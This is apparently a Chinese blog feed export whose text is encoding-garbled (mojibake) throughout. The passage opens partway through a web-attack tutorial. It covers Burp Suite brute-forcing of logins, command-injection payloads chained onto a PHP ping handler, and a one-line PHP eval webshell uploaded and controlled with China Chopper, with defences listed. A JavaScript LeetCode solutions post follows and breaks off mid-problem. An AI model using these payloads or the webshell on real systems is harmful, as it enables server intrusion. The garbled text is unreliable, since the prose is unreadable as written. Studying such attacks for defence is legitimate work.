ç‚¹å‡»ç™»é™†ï¼Œæ­¤æ—¶è¯·æ±‚ä¼šç”±BSæŽ§åˆ¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º: - å¤åˆ¶Rawæ•°æ®åŒ…åˆ° Intruder é¡µé¢ï¼Œè®¾ç½®æ•°æ®åŒ…ä¸­çš„è´¦å·å’Œå¯†ç çš„å ä½ï¼ˆAdd $ï¼‰ï¼Œåœ¨ Payloads ä¸­åŠ è½½æœ¬åœ°å­—å…¸ï¼ŒAttack typeé€‰æ‹©Cluster bombï¼Œè¿™æ ·æ¯æ¬¡è¯·æ±‚å°±ä¼šä»Žå­—å…¸ä¸­ä¾æ¬¡åŠ è½½å­—ç¬¦ä¸²ä½œä¸ºè´¦å·å’Œå¯†ç åŽ»è¯·æ±‚ã€‚å¦‚ä¸‹å›¾: - å¼€å§‹æ”»å‡»ä¹‹å‰è®¾ç½® Option ï¼Œä¾¿äºŽæˆ‘ä»¬å¿«é€Ÿæ‰¾å‡ºç™»å½•æˆåŠŸçš„è´¦å·å¯†ç ã€‚ç»è¿‡åˆ†æžï¼ŒAç½‘ç«™ç™»å½•æ— è®ºæ­£ç¡®é”™è¯¯éƒ½ä¼šè¿”å›ž302çŠ¶æ€ç ï¼ŒåŒºåˆ«åœ¨äºŽæ­£ç¡®æ—¶è¿”å›žå¤´Locationå­—æ®µä¸º index.phpï¼Œé”™è¯¯æ—¶ä¸º login.phpã€‚ - è®¾ç½®Grep Matchï¼Œæ–°å¢žâ€index.phpâ€ï¼Œå³å“åº”ä¸­åŒ…å«å­—ç¬¦ä¸²çš„è´¦å·å¯†ç ç»„åˆå°†è¢«æ‰“å‹¾æ ‡è®°ã€‚è®¾ç½®Grep Extractï¼Œå°†å“åº”ä¸­Locationä¹‹åŽçš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ã€‚å¦‚ä¸‹å›¾: - å¯è§ admin å’Œ password çš„ç»„åˆå³ä¸ºæ­£ç¡®è´¦å·å¯†ç ã€‚ ä¸ºäº†å¿«é€Ÿå‡ºç»“æžœï¼Œæ¼”ç¤ºä¸­è´¦å·å¯†ç å­—å…¸ä»…äº”ç§æƒ…å†µï¼Œ5*5 = 25æ¬¡å³å¯ç¡®å®šæ˜¯å¦èƒ½ç ´è§£ï¼Œå®žé™…åº”ç”¨ä¸­å­—å…¸é‡è¿œå¤§äºŽæ­¤ã€‚ é˜²èŒƒ 1231.å¤æ‚å¯†ç ä¸Žå¯†ç åŠ å¯†2.äººæœºè¯†åˆ«éªŒè¯3.æŽ¥å£è¯·æ±‚æ¬¡æ•°é™åˆ¶ å‘½ä»¤æ‰§è¡Œåº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„ system,exec,shell_exec ç­‰ã€‚ å¦‚ä¸‹åŽå°ä»£ç ï¼Œå°†å‰ç«¯è¾“å…¥æ¡†çš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œæ‰§è¡Œ ping å‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æžœæ‰“å°ã€‚ 12$cmd = shell_exec( &apos;ping -c 4 &apos; . $target );$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; æ­¤æ—¶å¯æž„é€ æ¶æ„è¾“å…¥å€¼å¦‚ä¸‹ï¼š 123baidu.com &amp;&amp; whoamibaidu.com &amp;&amp; cd ../ &amp;&amp; pwdbaidu.com &amp;&amp; cd ../ &amp;&amp; ls å®žé™…ç ´åä¸­åŽŸä¸ä»…ä»…æ˜¯ â€˜lsâ€™ è¿™ç§æ— å®³çš„å‘½ä»¤ã€‚ é˜²èŒƒ 1231.å¯¹Shellå‘½ä»¤ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œæ›¿æ¢ï¼Œå¦‚&apos;&amp;&apos;ï¼Œ&apos;|&apos;ï¼Œ&apos;;&apos;,&apos;||&apos;ç­‰ã€‚2.å¯¹äºŽç¡®å®šçš„è¾“å…¥ï¼Œæ¯”å¦‚IPï¼Œæ˜Žç¡®é™åˆ¶è¾“å…¥å€¼æ ¼å¼ã€‚3.æœåŠ¡å™¨æƒé™è®¾ç½®ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´žåˆ©ç”¨çš„ä¸‰ä¸ªé‡è¦æ¡ä»¶ï¼š 1231.å¯ä»¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ã€‚2.æ–‡ä»¶èƒ½è¢«æ‰§è¡Œã€‚3.ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„å¯çŸ¥ã€‚ åˆ©ç”¨æ­¥éª¤ Aç½‘ç«™å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œåˆ™æž„å»ºå¦‚ä¸‹ä¸€å¥è¯è„šæœ¬ï¼Œä¿å­˜ä¸º hack.php ä¸Šä¼ åˆ°Aç½‘ç«™ã€‚æ³¨æ„ apple å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²å¯ä»»æ„è®¾ç½®ã€‚ 123&lt;?php eval($_POST['apple']);?&gt; å‡è®¾å·²çŸ¥Aç½‘ç«™ä¸Šä¼ çš„æ–‡ä»¶éƒ½åœ¨/uploads/ç›®å½•ä¸‹ï¼Œå¯é€šè¿‡http://A.com/uploads/hack.phpè®¿é—®è¯¥æ–‡ä»¶ã€‚ æ‰“å¼€ ä¸­å›½èœåˆ€ è½¯ä»¶ï¼Œè¯¥è½¯ä»¶è¢«å®‰å…¨è½¯ä»¶æŠ¥ç—…æ¯’ï¼Œè°¨æ…Žä½¿ç”¨ã€‚ å³é”®æ·»åŠ SHELLï¼Œå¡«å†™ http://A.com/uploads/hack.php åŠ apple å­—ç¬¦ä¸²(ä¸Žhack.phpä¿æŒä¸€è‡´)ï¼Œç‚¹å‡»æ·»åŠ ã€‚å¦‚ä¸‹å›¾ï¼š å¦‚æžœè¯·æ±‚æˆåŠŸï¼Œåˆ™å¯ä»¥è¯»å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶,ä»¥åŠè¿è¡Œè™šæ‹Ÿç»ˆç«¯ã€‚å¦‚ä¸‹å›¾ï¼š å‚è€ƒèµ„æ–™ å¸¸è§Web å®‰å…¨æ”»é˜²æ€»ç»“ å‰ç«¯é¢è¯•ä¹‹é“ å›¾è§£Http Webå®‰å…¨çŸ¥å¤šå°‘ webå®‰å…¨ä¹‹ç‚¹å‡»åŠ«æŒ(clickjacking) URLé‡å®šå‘/è·³è½¬æ¼æ´ž ç½‘æ˜“webç™½å¸½å­ https://zhuanlan.zhihu.com/p/56122850 https://zhuanlan.zhihu.com/p/43292233]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FLeetCode%2F</url>
    <content type="text"><![CDATA[å‰è¨€ 1. ä¸¤æ•°ä¹‹å’Œç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›žä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚ ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚ ç¤ºä¾‹: ç»™å®š nums = [2, 7, 11, 15], target = 9 å› ä¸º nums[0] + nums[1] = 2 + 7 = 9 æ‰€ä»¥è¿”å›ž [0, 1] 1234567891011var twoSum = function(nums, target) &#123; let arr = [],length = nums.length; for(let i = 0;i&lt;length;++i)&#123; let temp = target - nums[i]; if(arr[temp]!=undefined)&#123; return [nums.indexOf(temp),i] &#125;else&#123; arr[nums[i]]=nums[i] &#125; &#125;&#125;; å“ˆå¸Œè¡¨çš„æ–¹æ³•ï¼Œç”¨ç©ºé—´æ¢æ—¶é—´ï¼Œç”¨æ•°ç»„çš„ç»“æž„ï¼Œè¦ç”¨indexOfæŸ¥è¯¢ä¸‹æ ‡ï¼Œè€—æ—¶ æ‰§è¡Œç”¨æ—¶ :104 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†72.39%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :34.5 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†72.79%çš„ç”¨æˆ· 1234567891011121314151617var twoSum = function(nums, target) &#123; let length = nums.length; let arr = new Object() for(let i = 0;i&lt;length;++i)&#123; let temp = target - nums[i]; if(arr.hasOwnProperty(temp))&#123; return [arr[temp],i] &#125;else&#123; Object.defineProperty(arr,nums[i],&#123; value : i, writable : true, enumerable : true, configurable : true &#125;) &#125; &#125;&#125;; å“ˆå¸Œè¡¨çš„æ–¹æ³•ï¼Œç”¨ç©ºé—´æ¢æ—¶é—´ï¼Œç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œç©ºé—´ç¨å¤§ä½†æ—¶é—´ä¼˜åŒ–è¿‘20% æ‰§è¡Œç”¨æ—¶ :84 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†84.29%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :36.3 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†7.49%çš„ç”¨æˆ· 2. ä¸¤æ•°ç›¸åŠ ç»™å‡ºä¸¤ä¸ª éžç©º çš„é“¾è¡¨ç”¨æ¥è¡¨ç¤ºä¸¤ä¸ªéžè´Ÿçš„æ•´æ•°ã€‚å…¶ä¸­ï¼Œå®ƒä»¬å„è‡ªçš„ä½æ•°æ˜¯æŒ‰ç…§ é€†åº çš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸”å®ƒä»¬çš„æ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ ä¸€ä½ æ•°å­—ã€‚ å¦‚æžœï¼Œæˆ‘ä»¬å°†è¿™ä¸¤ä¸ªæ•°ç›¸åŠ èµ·æ¥ï¼Œåˆ™ä¼šè¿”å›žä¸€ä¸ªæ–°çš„é“¾è¡¨æ¥è¡¨ç¤ºå®ƒä»¬çš„å’Œã€‚ æ‚¨å¯ä»¥å‡è®¾é™¤äº†æ•°å­— 0 ä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªæ•°éƒ½ä¸ä¼šä»¥ 0 å¼€å¤´ã€‚ ç¤ºä¾‹ï¼š è¾“å…¥ï¼š(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)è¾“å‡ºï¼š7 -&gt; 0 -&gt; 8åŽŸå› ï¼š342 + 465 = 807 1234567891011121314151617181920var addTwoNumbers = function(l1, l2) &#123; let temp = 0;let p=l1,q=l2; while(q!=null)&#123; if(p.next==null&amp;&amp;q.next!=null)&#123; p.next = new ListNode(0); &#125; if(q.next==null&amp;&amp;p.next!=null)&#123; q.next = new ListNode(0); &#125; let sumAll = temp + p.val + q.val; p.val = sumAll % 10; temp = Math.floor(sumAll / 10); if(p.next == null &amp;&amp; q.next == null &amp;&amp; temp!=0)&#123; p.next = new ListNode(temp); &#125; p=p.next q=q.next &#125; return l1&#125;; æµ…æ‹·è´ä¿å­˜å¼•ç”¨ï¼Œæ“ä½œpå’Œq æ‰§è¡Œç”¨æ—¶ :172 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†78.18%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :38.3 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†68.50%çš„ç”¨æˆ· 3. æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„ æœ€é•¿å­ä¸² çš„é•¿åº¦ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: â€œabcabcbbâ€è¾“å‡º: 3è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ â€œabcâ€ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚ç¤ºä¾‹ 2: è¾“å…¥: â€œbbbbbâ€è¾“å‡º: 1è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ â€œbâ€ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 1ã€‚ç¤ºä¾‹ 3: è¾“å…¥: â€œpwwkewâ€è¾“å‡º: 3è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ â€œwkeâ€ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚è¯·æ³¨æ„ï¼Œä½ çš„ç­”æ¡ˆå¿…é¡»æ˜¯ å­ä¸² çš„é•¿åº¦ï¼Œâ€pwkeâ€ æ˜¯ä¸€ä¸ªå­åºåˆ—ï¼Œä¸æ˜¯å­ä¸²ã€‚ 12345678910111213141516171819202122var lengthOfLongestSubstring = function(s) &#123; let arr =new Array(); let j=0; arr[j]=new Array(); for(let i = 0;i&lt;s.length;++i)&#123; let k = arr[j].indexOf(s.charAt(i)) if(k==-1)&#123; arr[j].push(s.charAt(i)) &#125;else&#123; j++ arr[j]=new Array() arr[j]=arr[j-1].slice(k+1) arr[j-1]=arr[j-1].length arr[j].push(s.charAt(i)) &#125; &#125; arr[j]=arr[j].length arr.sort((a,b)=&gt;&#123; return b-a &#125;) return arr[0]&#125;; å¼€ä¸€ä¸ªäºŒç»´æ•°ç»„å‚¨å­˜æ¯æ®µä¸é‡å¤å­ä¸²ï¼Œæ–°å¼€ä¸€ä¸ªå…ƒç´ å°±æŠŠä¸Šä¸€ä¸ªå…ƒç´ è½¬æ¢æˆå…·ä½“é•¿åº¦ï¼ŒæŽ’åºæ±‚è§£ æ‰§è¡Œç”¨æ—¶ :140 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†56.06%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :43 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†13.45%çš„ç”¨æˆ· 12345678910111213141516var lengthOfLongestSubstring = function(s) &#123; if(s.length==0)&#123; return 0 &#125; let obj = &#123;&#125;,ans = 0,start=0; for(let i =0;i&lt;s.length;i++)&#123; if(obj.hasOwnProperty(s.charAt(i)))&#123; start = Math.max(start,obj[s.charAt(i)]+1) obj[s.charAt(i)]=i &#125;else&#123; obj[s.charAt(i)]=i &#125; ans = Math.max(i-start,ans) &#125; return ans+1&#125;; æ»‘åŠ¨çª—å£https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/solution/hua-jie-suan-fa-3-wu-zhong-fu-zi-fu-de-zui-chang-z/ æ‰§è¡Œç”¨æ—¶ :136 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†59.07%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :40 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†55.58%çš„ç”¨æˆ· 4. å¯»æ‰¾ä¸¤ä¸ªæœ‰åºæ•°ç»„çš„ä¸­ä½æ•°ç»™å®šä¸¤ä¸ªå¤§å°ä¸º m å’Œ n çš„æœ‰åºæ•°ç»„ nums1 å’Œ nums2ã€‚ è¯·ä½ æ‰¾å‡ºè¿™ä¸¤ä¸ªæœ‰åºæ•°ç»„çš„ä¸­ä½æ•°ï¼Œå¹¶ä¸”è¦æ±‚ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(log(m + n))ã€‚ ä½ å¯ä»¥å‡è®¾ nums1 å’Œ nums2 ä¸ä¼šåŒæ—¶ä¸ºç©ºã€‚ ç¤ºä¾‹ 1: nums1 = [1, 3]nums2 = [2] åˆ™ä¸­ä½æ•°æ˜¯ 2.0ç¤ºä¾‹ 2: nums1 = [1, 2]nums2 = [3, 4] åˆ™ä¸­ä½æ•°æ˜¯ (2 + 3)/2 = 2.5 12345678910111213var findMedianSortedArrays = function(nums1, nums2) &#123; nums1 = nums1.concat(nums2) nums1 = nums1.sort((a,b)=&gt;&#123; return a-b &#125;) let m = nums1.length; if(m%2==0)&#123; return (nums1[m/2]+nums1[m/2-1])/2 &#125;else&#123; return nums1[Math.floor(m/2)] &#125;&#125;; æš´åŠ›æ³•ï¼Œåˆå¹¶æ•°ç»„åŽæŽ’åºå–å€¼ æ‰§è¡Œç”¨æ—¶ :204 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†54.66%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :39.3 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†61.53%çš„ç”¨æˆ· 5. æœ€é•¿å›žæ–‡å­ä¸²ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œæ‰¾åˆ° s ä¸­æœ€é•¿çš„å›žæ–‡å­ä¸²ã€‚ä½ å¯ä»¥å‡è®¾ s çš„æœ€å¤§é•¿åº¦ä¸º 1000ã€‚ ç¤ºä¾‹ 1ï¼š è¾“å…¥: â€œbabadâ€è¾“å‡º: â€œbabâ€æ³¨æ„: â€œabaâ€ ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰æ•ˆç­”æ¡ˆã€‚ç¤ºä¾‹ 2ï¼š è¾“å…¥: â€œcbbdâ€è¾“å‡º: â€œbbâ€ 1234567891011121314151617181920var longestPalindrome = function(s) &#123; let len = s.length,start = 0,end = 0; for(let i = 0;i&lt;len;++i)&#123; let l1 = centralExpand(s,i,i,len), l2 = centralExpand(s,i,i+1,len); let l3 = Math.max(l1,l2); if (l3 &gt; end - start) &#123; start = i - l3/2+1 end = i + l3/2+1 &#125; &#125; return s.substring(start, end);&#125;;function centralExpand(s,l,r,len)&#123; while(l&gt;=0 &amp;&amp; r&lt;=len &amp;&amp; s.charAt(l)==s.charAt(r))&#123; l--; r++; &#125; return r-l-1;&#125; ä¸­å¿ƒæ‰©å±•ç®—æ³•äº‹å®žä¸Šï¼Œåªéœ€ä½¿ç”¨æ’å®šçš„ç©ºé—´ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ O(n^2) çš„æ—¶é—´å†…è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æˆ‘ä»¬è§‚å¯Ÿåˆ°å›žæ–‡ä¸­å¿ƒçš„ä¸¤ä¾§äº’ä¸ºé•œåƒã€‚å› æ­¤ï¼Œå›žæ–‡å¯ä»¥ä»Žå®ƒçš„ä¸­å¿ƒå±•å¼€ï¼Œå¹¶ä¸”åªæœ‰ 2n - 1 ä¸ªä¸­å¿ƒã€‚å¯¹æ¯”æ‰©å±•ä¸­å¿ƒçš„ä¸¤ä¾§ æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)ï¼Œç”±äºŽå›´ç»•ä¸­å¿ƒæ¥æ‰©å±•å›žæ–‡ä¼šè€—åŽ» O(n) çš„æ—¶é—´ï¼Œæ‰€ä»¥æ€»çš„å¤æ‚åº¦ä¸º O(n^2)ã€‚ ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚ æ‰§è¡Œç”¨æ—¶ :180 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†62.54%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :37.1 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†57.35%çš„ç”¨æˆ· 6. Z å­—å½¢å˜æ¢å°†ä¸€ä¸ªç»™å®šå­—ç¬¦ä¸²æ ¹æ®ç»™å®šçš„è¡Œæ•°ï¼Œä»¥ä»Žä¸Šå¾€ä¸‹ã€ä»Žå·¦åˆ°å³è¿›è¡Œ Z å­—å½¢æŽ’åˆ—ã€‚ æ¯”å¦‚è¾“å…¥å­—ç¬¦ä¸²ä¸º â€œLEETCODEISHIRINGâ€ è¡Œæ•°ä¸º 3 æ—¶ï¼ŒæŽ’åˆ—å¦‚ä¸‹ï¼š L C I RE T O E S I I GE D H Nä¹‹åŽï¼Œä½ çš„è¾“å‡ºéœ€è¦ä»Žå·¦å¾€å³é€è¡Œè¯»å–ï¼Œäº§ç”Ÿå‡ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ï¼šâ€LCIRETOESIIGEDHNâ€ã€‚ è¯·ä½ å®žçŽ°è¿™ä¸ªå°†å­—ç¬¦ä¸²è¿›è¡ŒæŒ‡å®šè¡Œæ•°å˜æ¢çš„å‡½æ•°ï¼š string convert(string s, int numRows); 123456789101112131415161718192021222324252627282930313233343536var convert = function(s, numRows) &#123; let str = []; if(numRows==1|s.length==1|s.length&lt;=numRows)&#123; return s &#125; for(let i=0;i&lt;s.length/(numRows*2-2);++i)&#123; str[i]= s.substring(i*(numRows*2-2),(i+1)*(numRows*2-2)); str[i]=str[i].split(&quot;&quot;); &#125; let strs = []; for(let j=0;j&lt;numRows;++j)&#123; strs[j]=&apos;&apos;; if(j==0)&#123; for(let i=0;i&lt;str.length;++i)&#123; strs[j]+=str[i][0]; &#125; &#125;else if(j==numRows-1)&#123; for(let i=0;i&lt;str.length;++i)&#123; if(str[i][numRows-1])&#123; strs[j]+=str[i][numRows-1]; &#125; &#125; &#125;else&#123; for(let i=0;i&lt;str.length;++i)&#123; if(str[i][numRows*2-2-j])&#123; strs[j]+=str[i][j]+str[i][numRows*2-2-j]; &#125;else if(str[i][j])&#123; strs[j]+=str[i][j] &#125; &#125; &#125; &#125; strs=strs.join(&quot;&quot;) return strs;&#125;; æ‰§è¡Œç”¨æ—¶ :152 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†47.37%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :39.1 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†46.97%çš„ç”¨æˆ· 7. æ•´æ•°åè½¬ç»™å‡ºä¸€ä¸ª 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä½ éœ€è¦å°†è¿™ä¸ªæ•´æ•°ä¸­æ¯ä½ä¸Šçš„æ•°å­—è¿›è¡Œåè½¬ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: 123è¾“å‡º: 321 ç¤ºä¾‹ 2: è¾“å…¥: -123è¾“å‡º: -321ç¤ºä¾‹ 3: è¾“å…¥: 120è¾“å‡º: 21æ³¨æ„: å‡è®¾æˆ‘ä»¬çš„çŽ¯å¢ƒåªèƒ½å­˜å‚¨å¾—ä¸‹ 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œåˆ™å…¶æ•°å€¼èŒƒå›´ä¸º [âˆ’2^31, 2^31 âˆ’ 1]ã€‚è¯·æ ¹æ®è¿™ä¸ªå‡è®¾ï¼Œå¦‚æžœåè½¬åŽæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å›ž 0ã€‚ 1234567var reverse = function(x) &#123; var x1 = x &lt; 0 ? -1 : 1; let y = Math.abs(x); y = y.toString().split(&apos;&apos;).reverse().join(&apos;&apos;); let s = +y*x1 return s&gt;Math.pow(2, 31) - 1||s&lt;-Math.pow(2, 31)?0:s&#125;; æ‰§è¡Œç”¨æ—¶ :112 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†51.81%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.8 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†40.11%çš„ç”¨æˆ· 8. å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi)123456789101112131415161718192021222324252627/** * @param &#123;string&#125; str * @return &#123;number&#125; */var myAtoi = function(str) &#123; str = str.trim() let f = false,reg = /^\d*/ if(str.charAt(0)==&quot;-&quot;)&#123; f = true str = str.substring(1) &#125;else if(str.charAt(0)==&quot;+&quot;)&#123; str = str.substring(1) &#125; let number = parseInt(str.match(reg)) if(isNaN(number))&#123; return 0 &#125; if(number&gt;=2147483648&amp;&amp;f==true)&#123; number = 2147483648 &#125;else if(number&gt;=2147483648)&#123; number = 2147483647 &#125; if(f)&#123; number*=-1 &#125; return number&#125;; æš´åŠ›ç ´è§£ æ‰§è¡Œç”¨æ—¶ :92 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†96.15%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :36.2 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†35.32%çš„ç”¨æˆ· 1234567891011var myAtoi = function(str) &#123; str = parseInt(str)||0; if(str&gt;2147483647 )&#123; return 2147483647 &#125; if(str&lt;-2147483648 )&#123; return -2147483648 &#125; return str;&#125;; parseIntå·²ç»å®žçŽ°è¿™ä¸ªåŠŸèƒ½äº†â€¦ 10. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² s å’Œä¸€ä¸ªå­—ç¬¦è§„å¾‹ pï¼Œè¯·ä½ æ¥å®žçŽ°ä¸€ä¸ªæ”¯æŒ â€˜.â€™ å’Œ â€˜*â€™ çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚ â€˜.â€™ åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦â€˜*â€™ åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå‰é¢çš„é‚£ä¸€ä¸ªå…ƒç´ æ‰€è°“åŒ¹é…ï¼Œæ˜¯è¦æ¶µç›– æ•´ä¸ª å­—ç¬¦ä¸² sçš„ï¼Œè€Œä¸æ˜¯éƒ¨åˆ†å­—ç¬¦ä¸²ã€‚ è¯´æ˜Ž: s å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä»Ž a-z çš„å°å†™å­—æ¯ã€‚p å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä»Ž a-z çš„å°å†™å­—æ¯ï¼Œä»¥åŠå­—ç¬¦ . å’Œ * 123var isMatch = function(s, p) &#123; return new RegExp(&quot;^&quot;+p+&quot;$&quot;).test(s)&#125;; èµ–çš®åšæ³•ï¼ŒJSæ— è„‘è¿‡ æ‰§è¡Œç”¨æ—¶ :92 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†94.99%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :34.9 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†37.08%çš„ç”¨æˆ· 11. ç››æœ€å¤šæ°´çš„å®¹å™¨ç»™å®š n ä¸ªéžè´Ÿæ•´æ•° a1ï¼Œa2ï¼Œâ€¦ï¼Œanï¼Œæ¯ä¸ªæ•°ä»£è¡¨åæ ‡ä¸­çš„ä¸€ä¸ªç‚¹ (i, ai) ã€‚åœ¨åæ ‡å†…ç”» n æ¡åž‚ç›´çº¿ï¼Œåž‚ç›´çº¿ i çš„ä¸¤ä¸ªç«¯ç‚¹åˆ†åˆ«ä¸º (i, ai) å’Œ (i, 0)ã€‚æ‰¾å‡ºå…¶ä¸­çš„ä¸¤æ¡çº¿ï¼Œä½¿å¾—å®ƒä»¬ä¸Ž x è½´å…±åŒæž„æˆçš„å®¹å™¨å¯ä»¥å®¹çº³æœ€å¤šçš„æ°´ã€‚ è¯´æ˜Žï¼šä½ ä¸èƒ½å€¾æ–œå®¹å™¨ï¼Œä¸” n çš„å€¼è‡³å°‘ä¸º 2ã€‚ ç¤ºä¾‹: è¾“å…¥: [1,8,6,2,5,4,8,3,7]è¾“å‡º: 49 1234567891011var maxArea = function(height) &#123; let maxarea = 0, l = 0, r = height.length - 1; while (l &lt; r) &#123; maxarea = Math.max(maxarea, Math.min(height[l], height[r]) * (r - l)); if (height[l] &lt; height[r]) l++; else r--; &#125; return maxarea;&#125;; å¤–å›´é€¼è¿‘ï¼Œä¸­é—´æ‰©å±•ä»¥åŠæ»‘åŠ¨çª—å£éƒ½è·ªäº† æ‰§è¡Œç”¨æ—¶ :64 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†99.65%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.4 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†63.90%çš„ç”¨æˆ· 55. è·³è·ƒæ¸¸æˆç»™å®šä¸€ä¸ªéžè´Ÿæ•´æ•°æ•°ç»„ï¼Œä½ æœ€åˆä½äºŽæ•°ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚ æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ä»£è¡¨ä½ åœ¨è¯¥ä½ç½®å¯ä»¥è·³è·ƒçš„æœ€å¤§é•¿åº¦ã€‚ åˆ¤æ–­ä½ æ˜¯å¦èƒ½å¤Ÿåˆ°è¾¾æœ€åŽä¸€ä¸ªä½ç½®ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: 